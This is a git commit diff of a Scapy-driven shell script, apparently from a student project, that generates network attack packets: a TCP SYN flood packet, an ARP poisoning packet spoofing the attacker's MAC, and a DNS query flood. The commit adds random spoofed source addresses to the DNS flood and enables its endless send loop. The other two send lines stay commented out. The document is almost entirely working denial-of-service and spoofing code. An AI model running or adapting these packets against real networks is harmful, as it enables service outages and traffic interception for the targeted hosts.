6dbb288512d510c1992681e079da9d5e8d6b7097
Pavel <pavel.benacek@gmail.com>
2011-12-20 15:57:41 +0100

    scapy: pridano generovani nahodneho zdroje

--- scapy/SCAP_GEN.sh
+++ scapy/SCAP_GEN.sh
@@ -17,13 +17,16 @@ DNS_QUERY="www.fit.cvut.cz."
 scapy <<-END
 #1)generovani paketu pro SYN
 packetSYN=IP(dst="$SYN_DST_ADDRESS")/TCP(dport=$SYN_DST_PORT, flags='S')
+ls(packetSYN)
 #send(packetSYN,loop=1) #posilej paket v nekonecne smycce
 
 #2)ARP poisoning
 packetARP=Ether(dst="$VICTIM_MAC")/ARP(op="is-at",hwsrc="$ATTACKER_MAC",psrc="$SPOOFED_SENDER_IP",pdst="$SPOOFED_IP")
+ls(packetARP)
 #sendp(packetARP,loop=1) #posilej paket v nekonecne smycce
 
 #3)DNS flood
-dnsq=IP(dst="$DNS_FLOOD_VICTIM")/UDP()/DNS(rd=1,qr=0,qd=DNSQR(qname='$DNS_QUERY',qtype='A',qclass='IN'))
-#send(dnsq,loop=1)
+dnsq=IP(dst="$DNS_FLOOD_VICTIM",src=RandIP())/UDP()/DNS(rd=1,qr=0,qd=DNSQR(qname='$DNS_QUERY',qtype='A',qclass='IN'))
+ls(dnsq)
+send(dnsq,loop=1)
 END
